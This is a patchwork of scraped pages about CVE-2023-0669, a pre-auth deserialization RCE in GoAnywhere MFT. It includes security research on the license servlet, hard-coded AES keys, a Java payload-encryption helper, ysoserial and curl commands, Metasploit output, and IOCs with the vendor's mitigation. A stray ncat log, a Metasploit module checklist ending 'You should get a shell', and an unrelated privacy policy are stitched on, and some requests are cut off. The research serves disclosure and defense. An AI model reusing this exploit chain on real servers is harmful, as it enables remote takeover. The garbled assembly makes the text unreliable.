Ncat: Connection from 10.0.0.219.
Ncat: Connection from 10.0.0.219:46832.

```
### Cross-site request forgery

The way this licensing code is *supposed* to work is:

* The administrator installs GoAnywhere MFT with no license
* When the administrator visits their installation, they’re sent to an internet URL, [https://my.goanywhere.com/lic/request?bundle=p55wfyVKXDVM\_bAVZtD[…](https://my.goanywhere.com/lic/request?bundle=p55wfyVKXDVM_bAVZtD[...)]
* The user authenticates and selects their license and everything
* my.goanywhere.com redirects the user back to their server, on the endpoint `/goanywhere/lic/accept`, with the `bundle=` parameter set to the encrypted and serialized license object (that we saw earlier). The redirect looks something like:

```
HTTP/2 302 Found
Date: Fri, 03 Feb 2023 21:25:04 GMT
Content-Length: 0

Cf-Cache-Status: DYNAMIC
Server: cloudflare
Cf-Ray: 793e3caaef30c36e-SEA

```

And sends the user to:

```
GET /goanywhere/lic/accept?bundle=p55[...]A$2 HTTP/1.1
Host: 10.0.0.219:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0

Upgrade-Insecure-Requests: 1

```

The administrator’s server decrypts, loads, and verifies the license, and the server is either licensed (or isn’t).

Note that there is no CSRF protection (and the cookie is not actually required, so no authentication is required to exploit this issue). That means that this can, *by design*, be exploited via cross-site request forgery—based on how the licensing works, the user is supposed to be redirected to that endpoint by a server that’s not on their network.

What all this means is that a sufficiently clever attacker who is familiar with the target network can target a user with network-level access to the administration port, and redirect the user’s browser (via an open redirect or phishing message or something else) to the vulnerable server.

### Patch Analysis

On February 7, 2023, Fortra released a patch – version 7.1.2 for both Linux and Windows. If we try to run [our Metasploit module](https://github.com/rapid7/metasploit-framework/pull/17607) against the patched version, we get an HTTP/400 error:

```
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > set RHOSTS 10.0.0.219
RHOSTS => 10.0.0.219
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > set LHOST 10.0.0.179
LHOST => 10.0.0.179
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444
[-] Exploit aborted due to failure: unexpected-reply: Expected the server to return HTTP/500, instead received HTTP/400
[*] Exploit completed, but no session was created.

```

In the logs, we can see that the request was rejected due to being from an “invalid session”:

```
2/8/23, 2:31:49 PM ERROR An error occurred while processing the request URI '/goanywhere/lic/accept/0ec5b0f4-c0a7-4df9-abfd-e9ccff5c5e89' from the ip address '10.0.0.179'. The HTTP status code is '500'
2/8/23, 2:53:24 PM ERROR Unauthorized bundle from invalid session: _ej

```

Looking at the `LicenseResponseServlet` class again, we see where that error message came from:

```
public class LicenseResponseServlet extends HttpServlet {
    // [...]
    public void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        String parameter = httpServletRequest.getParameter(LicenseServer.BUNDLE_PARAM);
        String[] split = httpServletRequest.getRequestURI().split("/");
        if (!SessionUtilities.isLicenseRequestTokenValid(split[split.length - 1], httpServletRequest.getSession())) {
            LOGGER.error("Unauthorized bundle from invalid session: " + parameter);
            httpServletResponse.sendError(400);
            httpServletRequest.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
            return;
        }
        // [...]
    }
    // [...]
}

```

The new code in `SessionUtilities.isLicenseRequestTokenValid()` checks a random UUID that is generated when performing the licensing request and stored in the session:

```
    public static boolean isLicenseRequestTokenValid(String str, HttpSession httpSession) {
        if (httpSession != null) {
            String str2 = (String) httpSession.getAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
            if (str != null && str.equals(str2)) {
                return true;
            }
            return false;
        }
        return false;
    }

```

That token is basically an anti-CSRF token, and is sent to the server as part of the encrypted bundle. But because the bundle is symmetrically encrypted, we can actually get access to that value. We can get the encrypted bundle from a new server (with no license installed) by requesting the manual activation page:

```
$ curl 'http://10.0.0.219:8000/goanywhere/license/ManualLicense.xhtml'
[...]
p55wfyVKXDVM/bAVZtDLOg[.......]$2
[...]

```

That page isn’t accessible (anonymously) once a license has been installed, though. But after trying different requests, we noticed that you can append a character to the `Unlicensed.xhtml` page to view it even after licensing the server. Here’s an example, where we changed the page to `Unlicensed.xhtmlx`:

```
$ curl -i 'http://10.0.0.219:8000/goanywhere/license/Unlicensed.xhtmlx?GARequestAction=activate'
HTTP/1.1 302
[...]

Content-Length: 0
Date: Wed, 08 Feb 2023 23:36:58 GMT

```

The `bundle` parameter in the `Location` header is the encrypted bundle. We wrote some Java code that uses GoAnywhere MFT’s own libraries to decrypt it:

```
import com.linoma.license.gen2.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.nio.charset.StandardCharsets;
import java.security.SignedObject;
import java.util.zip.GZIPInputStream;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;
public class DecodeBundle {
  public static void main(String[] args) throws Exception {
    // Initialize the encryption code
    LicenseEncryptor.getInstance().initialize(true);
    // Decode the base64
    byte []decoded = Base64.decodeBase64(args[0].getBytes(StandardCharsets.UTF_8));
    // Decrypt the AES
    byte []decrypted = LicenseEncryptor.getInstance().decrypt(decoded, "2");
    // Unwrap the data that's in a SignedObject and SignedContainer
    ObjectInputStream secureObjectInputStream = new ObjectInputStream(new ByteArrayInputStream(decrypted));
    SignedObject signedObject = (SignedObject) secureObjectInputStream.readObject();
    byte[] data = ((SignedContainer) signedObject.getObject()).getData();
    // Uncompress
    GZIPInputStream gZIPInputStream = new GZIPInputStream(new ByteArrayInputStream(data));
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    IOUtils.copy(gZIPInputStream, byteArrayOutputStream);
    byte []uncompressed = byteArrayOutputStream.toByteArray();
    // Display
    System.out.write(uncompressed);
  }
}

```

It has to be compiled and executed using GoAnywhere MFT’s .jar files in order to access the functions:

```
$ export CP=".:GoAnywhere-7.1.2/lib/licenseapi-2.0-4.0.1.jar:GoAnywhere-7.1.2/lib/linoma-security-commons-1.0.0.jar:GoAnywhere-7.1.2/lib/commons-io-2.11.0.jar:GoAnywhere-7.1.2/lib/commons-codec-1.15.jar:GoAnywhere-7.1.2/lib/linoma-security-core-1.0.0.jar"
$ javac -cp $CP DecodeBundle.java && java -cp $CP DecodeBundle "p55[...]k"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<request v="2" t="1">

    <s os="Linux">
        <u>00-0C-29-47-38-B5</u>
    </s>
</request>

```

It successfully decrypted the token, giving us a `<process>` and `<cancel>` link. The `<process>` link specifically contains the full URL you need to successfully pass the new `LICENSE_REQUEST_TOKEN` check. Here’s how we can send the same payload (note that we also need the session ID cookie – `ASESSIONID`):

```
$ curl -ib 'ASESSIONID=CE484D19BEF02A4C4093EFA1F5626B54' -ik 'http://10.0.0.219:8000/goanywhere/lic/accept/d2d80248-5013-41b8-8cbf-1c1ca9bc3541?bundle='$(ruby ./poc-cve-2023-0669.rb ./payload.ser)'$2'
HTTP/1.1 500
X-UA-Compatible: IE=edge
[...]

```

With that change, we are now back to the HTTP/500 error from earlier! But in the logs, we see a new error:

```
com.linoma.license.gen2.BundleException: Class name not accepted: java.util.PriorityQueue
	at com.linoma.license.gen2.BundleWorker.unbundle(BundleWorker.java:136)
	at com.linoma.license.gen2.LicenseController.getResponse(LicenseController.java:441)
	at com.linoma.license.gen2.LicenseAPI.getResponse(LicenseAPI.java:304)
[...]
Caused by: java.io.InvalidClassException: Class name not accepted: java.util.PriorityQueue

	at org.apache.commons.io.serialization.ValidatingObjectInputStream.resolveClass(ValidatingObjectInputStream.java:100)

```

That led us to look more closely at the `BundleWorker.validate()` function:

```
   private static byte[] verify(byte[] bArr, KeyConfig keyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
        ObjectInputStream secureObjectInputStream = getSecureObjectInputStream(bArr, SignedObject.class, byte[].class);
        try {
            String str = JCAConstants.SIGNATURE_DSA_SHA1;
            if ("2".equals(keyConfig.getVersion())) {
                str = JCAConstants.SIGNATURE_RSA_SHA512;
            }
            PublicKey publicKey = getPublicKey(keyConfig);
            SignedObject signedObject = (SignedObject) secureObjectInputStream.readObject();
            if (!signedObject.verify(publicKey, Signature.getInstance(signatureType))) {
                throw new IOException("Unable to verify signature!");
            }
            byte[] data = ((SignedContainer) signedObject.getObject()).getData();
            if (secureObjectInputStream != null) {
                secureObjectInputStream.close();
            }
            return data;
        } catch (Throwable th) {
            // [...]
        }
    }

```

`getSecureObjectInputStream` returns an instance of `org.apache.commons.io.serialization.ValidatingObjectInputStream` that only permits two classes to be deserialized: `SignedObject` and `byte[]`. The first thing it does after creating the `SignedObject` is to verify it, using a `publicKey` that’s decrypted from a local keystore. We verified that we don’t have the associated private key, nor can we modify fields in `SignedObject` to force the `verify()` call to pass, so this signature check appears to prevent further exploitation.

So in the end, we were able to bypass the new `LICENSE_REQUEST_TOKEN` requirement, but the `ValidatingObjectInputStream` and `SignedObject` prevents a malicious object from being deserialized.

## IOCs

The vendor’s advisory suggests the following:

```
Search the userdata/logs/[system_name]-goanywhere.log files on your system.
NOTE: By default there are 10 logs that are archived when a log size reaches 5 MB. [system_name] represents each system or node in your cluster. You should search all of these 10 archive logs for all systems/nodes in your cluster. Standalone (non-HA) logs will be goanywhere.log, goanywhere.log1, goanywhere.log2, etc.)
The search term should be for the following line:
java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
     at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171)
     at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
     at java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
     at java.util.PriorityQueue.heapify(PriorityQueue.java:736)
     at java.util.PriorityQueue.readObject(PriorityQueue.java:796)

```

We confirmed that that’s the error that our proof of concept generates, as well. Keep in mind, however, that the attacker can delete that logfile if they choose.

## Guidance

As of writing, this issue is not patched, and therefore all installations are vulnerable. Ensuring that network-level access to the administrator port is restricted to the least number of users possible is good; however, because this can be exploited via a user’s browser, it only raises the bar.

The vendor advises that user’s remove access to the vulnerable endpoint in their `web.xml` file:

```
-   Disable the LicenseResponseServlet as follows:
-   On the file system where GoAnywhere MFT is installed, edit the file [install_dir]/adminroot/WEB-INF/web.xml
-   Find and remove (delete or comment out) the following servlet and servlet-mapping configuration in the screenshot below.
**Before:**
           <servlet>
                      <servlet-name>License Response Servlet</servlet-name>
                      <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
                      <load-on-startup>0</load-on-startup>
           </servlet>
           <servlet-mapping>
                      <servlet-name>License Response Servlet</servlet-name>
                      <url-pattern>/lic/accept</url-pattern>
           </servlet-mapping>
**After:**
<!--
Add these tags to comment out the following section (as shown) or simply delete this section if you are not familiar with XML comments
-->
<!--
           <servlet>
                      <servlet-name>License Response Servlet</servlet-name>
                      <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
                      <load-on-startup>0</load-on-startup>
           </servlet>
           <servlet-mapping>
                      <servlet-name>License Response Servlet</servlet-name>
                      <url-pattern>/lic/accept</url-pattern>
           </servlet-mapping>
-->
-   Restart the GoAnywhere MFT application.

```

We confirmed that the mitigation steps work.

# GoAnywhere MFT - A Forgotten Bug

Feb 6, 2023

## Déjà-vu

It all began with [a toot by Brian Krebs](https://infosec.exchange/%40briankrebs/109795710941843934) on 2nd February, 2023, providing information on an “On Prem Notification/Technical BulletinFeb 1, 2023”. This advisory was only accessible by registered users, describing a upcoming threat originated from an 0day affecting the file transfer solution product [GoAnywhere MFT](https://www.goanywhere.com/). Nice, because I remembered looking at parts of it years ago: **2021** too be more precise. During my first steps of security code review on GoAnywhere then, I got interested in a clustering message exchange library [JGroups](https://github.com/belaban/JGroups) and did some research showing insecure deserialization effects. A “JGroups PoC project” of this work can be found in my [GitHub repository](https://github.com/Frycos/JGroupsJChannelPoC).

Well then, looking at the GoAnywhere security advisory again, there were some temporary mitigations listed. One should modify the web descriptor file `[install_dir]/adminroot/WEB_INF/web.xml` and delete a certain Servlet definition with its corresponding URL mapping: `<servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>`. **Wait a minute**: I checked my notes from 2021 and found this.

![oldnotes](/assets/images/mft/oldnotes.png)

Indeed, back in 2021 I already made some notes on a dangerous sink which will become relevant in the blog post. *FTAPI* mentioned in the snippet above had an [insecure deserialization bug prior to version 4.6.3](https://web.archive.org/web/20200814001535/https%3A//www.ftapi.com/Release-Notes#collapse_8695) in a LicenseController class, leading to Remote Code Execution (RCE). This to me was the same kind of bug in GoAnywhere MFT but it was the administration console: I couldn’t find many instances on the Internet in 2021. What I didn’t know: JGroups. So I focused on that and forgot about the other things in my notes…until today (2nd February, 2022).

I could provide a working [PoC](https://gist.github.com/Frycos/d7ec4de07123f78cc37d29890dce0313) (compare hash and time of my [tweet](https://twitter.com/frycos/status/1621272883069591554)) to my teammates within hours on the same day to protect our clients first. But now let’s go the Code Review part.

## Code Review

In my case, I chose the Windows installation to get the latest version **7.1.1** at that time. It doesn’t really matter which operating system since it’s all based on Java. The installation location: `C:\Program Files\HelpSystems\GoAnywhere`. The `web.xml` from the security advisory in the `adminroot` directory indeed contained the Servlet definition and URL mapping.

```
<servlet>

    <servlet-name>License Response Servlet</servlet-name>

    <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>

    <load-on-startup>0</load-on-startup>

</servlet>

<servlet-mapping>

    <servlet-name>License Response Servlet</servlet-name>

    <url-pattern>/lic/accept</url-pattern>

</servlet-mapping>

```

Let’s dive into the code. The `com.linoma.ga.ui.admin.servlet.LicenseResponseServlet` extends `HttpServlet` as expected. Requests are processed by different standard methods such as `com.linoma.ga.ui.admin.servlet.LicenseResponseServlet.doPost(HttpServletRequest, HttpServletResponse)` in our case.

```
public void doPost(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse) throws ServletException, IOException {
  String str1 = paramHttpServletRequest.getParameter("bundle"); // [1]

  Response response = null;

  try {
    response = LicenseAPI.getResponse(str1); // [2]
  } catch (Exception exception) {
    LOGGER.error("Error parsing license response", exception);
    paramHttpServletResponse.sendError(500);
  }

  paramHttpServletRequest.getSession().setAttribute("LicenseResponse", response);
	// ...

```

At `[1]` the request parameter `bundle` is stored in the String `str1` and put into the method call at `[2]`. From`com.linoma.license.gen2.LicenseAPI.getResponse(String)` we follow further into `com.linoma.license.gen2.LicenseController.getResponse(String)`.

```
protected static Response getResponse(String paramString) throws BundleException, JAXBException {
  String str1 = getVersion(paramString); // [3]
  String str2 = BundleWorker.unbundle(paramString, getProductKeyConfig(str1));
  return (Response)inflate(str2, Response.class);
}

```

First, we step into the method definition at `[3] getVersion` in the same class.

```
protected static String getVersion(String paramString) {
  int i = paramString.indexOf('$');
  if (i > -1) {
    null = paramString.substring(i + 1);
    null = null.replace("\r", "");
    return null.replace("\n", "");
  }

  return "1";
}

```

This seems to be a version differentiation of some kind based on the fact if our `bundle` parameter contains a `$` character or not. Let’s say “no” (we can change our assumptions later any time if needed). `1` will be returned then.

Back to our caller and the next code line leads us to another method `BundleWorker.unbundle(paramString, getProductKeyConfig(str1))`. `getProductKeyConfig` looks like this:

```
private static KeyConfig getProductKeyConfig(String paramString) throws BundleException {
  KeyConfig keyConfig = new KeyConfig();
  inputStream = null;
  try {
    String str = "";
    if ("2".equals(paramString)) { // [4]
      str = "1";
    }

    inputStream = LicenseController.class.getResourceAsStream("linomagen2.bcks");
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    IOUtils.copy(inputStream, byteArrayOutputStream);
    keyConfig.setKeyStore(byteArrayOutputStream.toByteArray());

    keyConfig.setSigningAlias("productkey" + str);
    keyConfig.setVerifyingAlias("serverkey" + str);
    keyConfig.setPassword("G@mft2018".toCharArray()); // [5]
    keyConfig.setVersion(paramString);
    keyConfig.setKeyStoreType("BCFKS");
    return keyConfig;
	  // ...

```

Nothing too interesting here: `[4]` makes again some version differentiation stuff and at `[5]` hard-coded passwords are defined for a key-store. Does GoAnywhere like hard-coded keys? Let’s keep this in mind.

Now we enter something familiar (see my note in the introductory chapter): `com.linoma.license.gen2.BundleWorker.unbundle(String, KeyConfig)`.

```
protected static String unbundle(String paramString, KeyConfig paramKeyConfig) throws BundleException {
  try {
    if (!"1".equals(paramKeyConfig.getVersion())) {
      paramString = paramString.substring(0, paramString.indexOf("$"));
    }

    byte[] arrayOfByte = decode(paramString.getBytes(StandardCharsets.UTF_8)); // [6]

    arrayOfByte = decrypt(arrayOfByte, paramKeyConfig.getVersion()); // [7]

    arrayOfByte = verify(arrayOfByte, paramKeyConfig); // [8]

    return new String(decompress(arrayOfByte), StandardCharsets.UTF_8);
	  // ...

```

The method at `[6]` performs a Base64 decoding step. At `[7]` the byte array should be decrypted. How does `decrypt` look like?

We land in `com.linoma.license.gen2.LicenseEncryptor.decrypt(byte[], String)`.

```
public byte[] decrypt(byte[] paramArrayOfByte, String paramString) throws CryptoException {
  if (!this.initialized) {
    throw new IllegalStateException("The License Encryptor has not been initialized");
  }
  if ("1".equals(paramString)) {
    if (this.encryptor == null) {
      throw new CryptoException("License Encryptor version 1 not available in FIPS mode.");
    }
    return this.encryptor.decryptToBytes(paramArrayOfByte); // [9]
  }
  return this.encryptorV2.decryptToBytes(paramArrayOfByte);
}

```

Remember the version differentiator? Since we control this, the decryption routine at `[9]` will be called (in case your not FIPS addicted).
Finally, in `com.linoma.security.core.crypto.StandardEncryptionEngine.decrypt(byte[])`, a `decryptionCipher.doFinal(paramArrayOfByte)` call decrypts the byte array. But as you might know, also in Java Crypto API one has to initialize the Crypto engine properly, same for the`com.linoma.security.core.crypto.StandardEncryptionEngine.decryptionCipher` class member. Using Eclipse’s “Call hierarchy” shortcut gives us the following tree, hitting the method `com.linoma.license.gen2.LicenseEncryptor.initialize(boolean)`.

![decryptHierarchy](/assets/images/mft/decryptHierarchy.png)

```
public void initialize(boolean paramBoolean) throws Exception {
  if (!paramBoolean) {
    this.encryptor = new Encryptor(new StandardEncryptionEngine(getInitializationValue(), IV, "AES", "AES/CBC/PKCS5Padding")); // [10]
  }
  this.encryptorV2 = new Encryptor(new StandardEncryptionEngine(getInitializationValueV2(), IV, "AES", "AES/CBC/PKCS5Padding"));
  this.initialized = true;
}

```

At `[10]`, the Cipher parameters are set. What about this initialization vector?
`private static final byte[] IV = {
65, 69, 83, 47, 67, 66, 67, 47, 80, 75, 67, 83, 53, 80, 97, 100 };`
looks pretty “static”, alright. What about the secret key? Let’s look into `com.linoma.license.gen2.LicenseEncryptor.getInitializationValue()`.

```
private byte[] getInitializationValue() throws Exception {
  byte[] arrayOfByte1 = { 103, 111, 64, 110, 121, 119, 104, 101, 114, 101, 76, 105, 99, 101, 110, 115, 101, 80, 64, 36, 36, 119, 114, 100 };

  byte[] arrayOfByte2 = { -19, 45, -32, -73, 65, 123, -7, 85 };
  char c1 = '┿';
  char c2 = 'Ā';

  SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
  PBEKeySpec pBEKeySpec = new PBEKeySpec((new String(arrayOfByte1, "UTF-8")).toCharArray(), arrayOfByte2, c1, c2);
  SecretKey secretKey = secretKeyFactory.generateSecret(pBEKeySpec);
  return secretKey.getEncoded();
}

```

The code speaks for itself. Hard-code all the things!

Ok, back to `com.linoma.license.gen2.BundleWorker.unbundle(String, KeyConfig)`. Now, we’re probably able to provide a request parameter which could be properly decrypted as well. Next, step would be the call to `com.linoma.license.gen2.BundleWorker.verify(byte[], KeyConfig)`.

```
private static byte[] verify(byte[] paramArrayOfByte, KeyConfig paramKeyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
  objectInputStream = null;
  try {
    String str = "SHA1withDSA";
    if ("2".equals(paramKeyConfig.getVersion())) {
      str = "SHA512withRSA";
    }
    PublicKey publicKey = getPublicKey(paramKeyConfig);
    objectInputStream = new ObjectInputStream(new ByteArrayInputStream(paramArrayOfByte));
    SignedObject signedObject = (SignedObject)objectInputStream.readObject(); // [11]
    Signature signature = Signature.getInstance(str);
    boolean bool = signedObject.verify(publicKey, signature);
	  // ...

```

Long story short: `[11]` calls `ObjectInputStream.readObject`, the best known sink to insecure deserialization. The one sink mentioned in my notes in 2021.

But deserialization doesn’t automatically mean RCE or similar kind of critical vulnerabilities. Some products have heavy hierarchies of well-defined Spartan-like class loaders, basically not giving you any attack vectors. Several SAP products are a really good example for this “issue”.

Looking to the `lib` folder containing all the JARs files used by GoAnywhere

makes the security researcher’s heart beat faster. A table of gifts. I’m a fan of the [ysoserial](https://github.com/frohoff/ysoserial) gadget `CommonsBeanutils1`. But we need some custom code to build our final payload first. Remember? The encryption/decryption part.

```
public class CryptorHelper {

	public static void main(String[] args) throws Exception, Exception {
		final byte[] IV = { 65, 69, 83, 47, 67, 66, 67, 47, 80, 75, 67, 83, 53, 80, 97, 100 };

		StandardEncryptionEngine see = new StandardEncryptionEngine(getInitializationValue(), IV, "AES",
				"AES/CBC/PKCS5Padding");

		Path path = Paths.get("/home/user/tmp/mspaint.bin");
		byte[] data = Files.readAllBytes(path);

		System.out.println("[+] Encrypted: " + new String(Base64.encodeBase64(see.encrypt(data)), "UTF-8"));

	}

	private static byte[] getInitializationValue() throws Exception {
		byte[] arrayOfByte1 = { 103, 111, 64, 110, 121, 119, 104, 101, 114, 101, 76, 105, 99, 101, 110, 115, 101, 80,
				64, 36, 36, 119, 114, 100 };

		byte[] arrayOfByte2 = { -19, 45, -32, -73, 65, 123, -7, 85 };
		char c1 = '┿';
		char c2 = 'Ā';

		SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
		PBEKeySpec pBEKeySpec = new PBEKeySpec((new String(arrayOfByte1, "UTF-8")).toCharArray(), arrayOfByte2, c1, c2);
		SecretKey secretKey = secretKeyFactory.generateSecret(pBEKeySpec);
		return secretKey.getEncoded();
	}
}

```

We simply have to reuse the information gathered before, namely hard-coded keys and usage of Crypto API parameters. The serialized Java object created before with ysoserial goes into the file `/home/user/tmp/mspaint.bin` and the final encrypted Base64-encoded payload is printed to standard out.

First things first: `java -cp /home/user/MFT/lib/commons-beanutils-1.9.4.jar:./ysoserial-master-SNAPSHOT.jar ysoserial.GeneratePayload CommonsBeanutils1 "cmd.exe /K mspaint" > mspaint.bin`.

Why didn’t I call `java -jar ysoserial.jar` instead? Because I wanted to make sure that the proper `commons-beanutils-X.Y.Z.jar` is used, the one provided in GoAnywhere’s `lib` directory. Class path order takes care of choosing the proper JAR even though another BeanUtils JAR is included in the ysoserial JAR itself. We don’t want to have any issues with mismatches of *serialVersionUID*s, do we?

Now, let’s run the `CryptoHelper`: `[+] Encrypted: Jh88/jqGQWSbZmiCc1DErQhwOhCTLkYmA1yXgf86Ha5HF9IfVuQMLOfBS/fjlP7wTTEg2+Jx9nBDyFUKVTroXpFBt7zN1XDX58VKZCxCXlUD45d4laUUnNuzdyvNLT2b/.....`. Looks good!

## PoC

The final request is built like this

```
POST /goanywhere/lic/accept HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0

```

## Verification

List the steps needed to make sure this thing works

* Start `msfconsole`
* `use exploit/linux/http/fortra_goanywhere_rce_cve_2023_0669`
* `set LHOST` / `set RHOST` / `exploit`
* You should get a shell

I included a documentation file with lots of info / examples. LMK if you need the software (a copy should be on our vulnerable software drive).

Cheers!

Sorry, something went wrong.

**Overview**

The privacy practices of this statement apply to our services available under the domains and subdomains of goanywhere.com and helpsystems.com (the "Site"). By visiting this Site you agree to be bound by the terms and conditions of this Privacy Policy.

**1. Protection of Children's Personal Information**

This Site is a general audience site and does not knowingly collect any personal information from children.

Our primary purpose in collecting personal information is to provide you with a safe, smooth, efficient, and customized experience. This allows us to provide services and features that most likely meet your needs, and to customize our service to make your experience safer and easier. We only collect personal information about you that we consider necessary for achieving this purpose.

In general, you can browse the Site without telling us who you are or revealing any personal information about yourself. Once you give us your personal information, you are not anonymous to us. If you choose to use our services, we may require you to provide contact and identity information, billing information, shipping information and other personal information as indicated on the forms throughout the Site. Where possible, we indicate which fields are required and which fields are optional. You always have the option to not provide information by choosing not to use a particular service or feature.

We may use information for several general purposes: to fulfill your requests for certain products and services, to personalize your experience on our website, to keep you up to date on the latest product announcements, software updates, special offers or other information we think you'd like to hear about either from us or from our business partners, and to better understand your needs and provide you with better services. We may also use your information to send you, or to have our business partners send you, direct marketing information or contact you for market research.

You agree that we may use personal information about you to improve our marketing and promotional efforts, to analyze site usage, improve our content and product offerings, and customize the Site's content, layout, and services. These uses improve the Site and better tailor it to meet your needs, so as to provide you with a smooth, efficient, safe and customized experience while using the Site.

You agree that we or our business partners may use your personal information to contact you and deliver information to you that, in some cases, are targeted to your interests, such as targeted advertisements, administrative notices, product offerings, and communications relevant to your use of the Site. By accepting the User Agreement and Privacy Policy, you expressly agree to receive this information.

It cannot be used to deliver viruses, allow access, or execute code on your system.

**5. Our Disclosure of Your Information.**

As a matter of policy, we do not sell or rent any of your personal information to third parties for their marketing purposes without your explicit consent. However, the following describes some of the ways that your personal information may be disclosed.

Legal Requests. HelpSystems cooperates with law enforcement inquiries, as well as other third parties to enforce laws. Therefore, in response to a verified request by law enforcement or other government officials relating to a criminal investigation or alleged illegal activity, we can (and you authorize us to) disclose your name, city, state, telephone number and email address without a subpoena.

**7. Security.**

Your information is stored on the HelpSystems servers located in the United States. We use procedural and technical safeguards to protect your personal information against loss or theft as well as unauthorized access and disclosure to protect your privacy, including encryption, "firewalls" and Secure Socket Layers. We treat data as an asset that must be protected against loss and unauthorized access. We employ many different security techniques to protect such data from unauthorized access by users inside and outside the company. However, "perfect security" does not exist on the Internet.

**8. Notice.**

We may amend this Privacy Policy at any time by posting the amend terms on the Site. All amended terms shall automatically be effective 30 days after they are initially posted on the Site. In addition, we will notify you in accordance with your Notification Preferences.
